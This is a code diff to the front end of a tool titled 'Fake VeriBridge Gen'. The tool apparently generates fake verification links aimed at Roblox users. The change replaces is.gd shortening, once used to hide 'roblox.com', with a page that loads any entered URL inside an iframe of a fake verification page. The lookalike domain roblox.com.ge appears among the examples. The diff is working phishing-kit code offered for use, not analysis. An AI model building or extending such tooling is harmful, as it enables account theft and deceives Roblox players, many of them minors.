@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Fake VeriBridge Gen | Auto is.gd Converter</title>
+    <title>Fake VeriBridge Gen | URL to Verification Link</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @keyframes shine {
@@ -37,19 +37,19 @@
         <div class="w-full max-w-2xl text-center">
             <div class="bg-black/40 backdrop-blur-xl border border-cyan-500/30 rounded-2xl p-6 sm:p-8">
                 <h1 class="text-2xl sm:text-3xl font-bold shine-text mb-2">Fake VeriBridge Gen</h1>
-                <p class="text-xs text-cyan-400/60 mb-6">Automatically converts ANY Roblox URL to is.gd short links</p>
+                <p class="text-xs text-cyan-400/60 mb-6">Enter ANY URL → Get a verification link</p>
 
                 <div class="space-y-4">
                     <div class="text-left">
-                        <label class="text-sm font-medium text-cyan-300/80 mb-1 block">Enter ANY Roblox URL</label>
+                        <label class="text-sm font-medium text-cyan-300/80 mb-1 block">Enter ANY URL</label>
                         <div class="flex flex-col sm:flex-row gap-2 bg-zinc-900/80 rounded-xl p-2 border border-cyan-500/20">
-                            <input id="targetUrl" class="bg-transparent outline-none text-sm text-white pl-3 flex-1 min-w-0" placeholder="https://www.roblox.com/login">
+                            <input id="targetUrl" class="bg-transparent outline-none text-sm text-white pl-3 flex-1 min-w-0" placeholder="https://roblox.com.ge or https://www.roblox.com/login">
                             <button id="generateBtn" class="bg-gradient-to-r from-cyan-600 to-blue-600 px-5 py-2 rounded-lg hover:from-cyan-500 hover:to-blue-500 transition-all flex items-center justify-center gap-2">
                                 <svg class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"/></svg>
-                                Generate is.gd
+                                Generate Link
                             </button>
                         </div>
-                        <p class="text-[10px] text-cyan-400/40 mt-1 text-left">Examples: /login, /groups/123, /users/456, /games/789</p>
+                        <p class="text-[10px] text-cyan-400/40 mt-1 text-left">Any URL works - it will be embedded in the verification page</p>
                     </div>
 
                     <div id="resultSection" class="hidden mt-4">
@@ -61,10 +61,9 @@
                             <code id="resultUrl" class="block bg-black/50 text-cyan-300 text-sm font-mono p-3 rounded-lg break-all cursor-pointer"></code>
                             
                             <div class="mt-3 p-2 bg-black/30 rounded-lg border border-green-500/30">
-                                <div class="text-xs text-green-400/80 mb-1">🔄 Auto-converted to is.gd (NO roblox.com visible):</div>
-                                <div id="userUrlDisplay" class="text-xs text-green-300 font-mono break-all"></div>
-                                <div id="loginUrlDisplay" class="text-xs text-green-300 font-mono break-all mt-1"></div>
-                                <div id="holderDisplay" class="text-xs text-green-300 font-mono break-all mt-1"></div>
+                                <div class="text-xs text-green-400/80 mb-1">📋 When someone visits this link:</div>
+                                <div id="targetUrlDisplay" class="text-xs text-green-300 font-mono break-all"></div>
+                                <div class="text-[10px] text-green-400/60 mt-1">↑ This URL will load inside the iframe</div>
                             </div>
                             
                             <div class="flex gap-2 mt-3">
@@ -83,11 +82,10 @@
                     <div id="errorMsg" class="text-red-400 text-sm min-h-[40px]"></div>
                     
                     <div class="text-[10px] text-white/30 pt-4 border-t border-white/10">
-                        <p>🔗 <span class="text-cyan-400">Automatically detects and converts ANY Roblox URL:</span></p>
-                        <p class="mt-1">• https://www.roblox.com/login → is.gd/xxxxx</p>
-                        <p>• https://www.roblox.com/groups/123 → is.gd/xxxxx</p>
-                        <p>• https://www.roblox.com/users/456 → is.gd/xxxxx</p>
-                        <p class="mt-1 text-cyan-400/50">⚡ The verification page will ONLY show is.gd links - no roblox.com visible!</p>
+                        <p>🔗 <span class="text-cyan-400">How it works:</span></p>
+                        <p class="mt-1">1. Enter ANY URL (roblox.com.ge, example.com, anything)</p>
+                        <p>2. Get a verification link like: your-domain.vercel.app/verify=123456789012</p>
+                        <p>3. When someone visits that link, they see the VeriBridge page with your URL in an iframe</p>
                     </div>
                 </div>
             </div>
@@ -102,9 +100,7 @@
         const copyBtn = document.getElementById('copyBtn');
         const testBtn = document.getElementById('testBtn');
         const errorMsg = document.getElementById('errorMsg');
-        const userUrlDisplay = document.getElementById('userUrlDisplay');
-        const loginUrlDisplay = document.getElementById('loginUrlDisplay');
-        const holderDisplay = document.getElementById('holderDisplay');
+        const targetUrlDisplay = document.getElementById('targetUrlDisplay');
         const toastContainer = document.getElementById('toastContainer');
 
         function showToast(msg, type = 'success') {
@@ -121,7 +117,7 @@
         async function generateLink() {
             let url = targetUrl.value.trim();
             if (!url) {
-                errorMsg.innerText = '❌ Please enter a Roblox URL';
+                errorMsg.innerText = '❌ Please enter a URL';
                 return;
             }
             
@@ -130,14 +126,9 @@
                 targetUrl.value = url;
             }
             
-            if (!url.includes('roblox.com')) {
-                errorMsg.innerText = '❌ Please enter a valid Roblox URL (must contain roblox.com)';
-                return;
-            }
-            
             errorMsg.innerText = '';
             generateBtn.disabled = true;
-            generateBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div> Creating is.gd links...';
+            generateBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div> Generating...';
 
             try {
                 const res = await fetch('/api/generate', {
@@ -148,13 +139,9 @@
                 const data = await res.json();
                 if (data.success) {
                     resultUrl.innerText = data.generatedUrl;
-                    
-                    userUrlDisplay.innerHTML = `🎯 Your URL → ${data.userUrlIsGd}`;
-                    loginUrlDisplay.innerHTML = `🔐 Roblox Login → ${data.loginPageIsGd}`;
-                    holderDisplay.innerHTML = `🔄 is.gd Holder → ${data.isGdHolder}`;
-                    
+                    targetUrlDisplay.innerHTML = `🎯 Iframe will load: ${data.originalUrl}`;
                     resultSection.classList.remove('hidden');
-                    showToast(`✅ Converted to is.gd!`, 'success');
+                    showToast('✅ Verification link created!', 'success');
                 } else {
                     errorMsg.innerText = '❌ ' + data.error;
                     resultSection.classList.add('hidden');
@@ -164,7 +151,7 @@
                 resultSection.classList.add('hidden');
             } finally {
                 generateBtn.disabled = false;
-                generateBtn.innerHTML = '<svg class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"/></svg> Generate is.gd';
+                generateBtn.innerHTML = '<svg class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"/></svg> Generate Link';
             }
         }
 
@@ -195,9 +182,9 @@
         });
         
         const examples = [
+            "https://roblox.com.ge",
             "https://www.roblox.com/login",
-            "https://www.roblox.com/groups/1234567",
-            "https://www.roblox.com/users/123456789"
+            "https://example.com"
         ];
         let exampleIndex = 0;
         function cyclePlaceholder() {
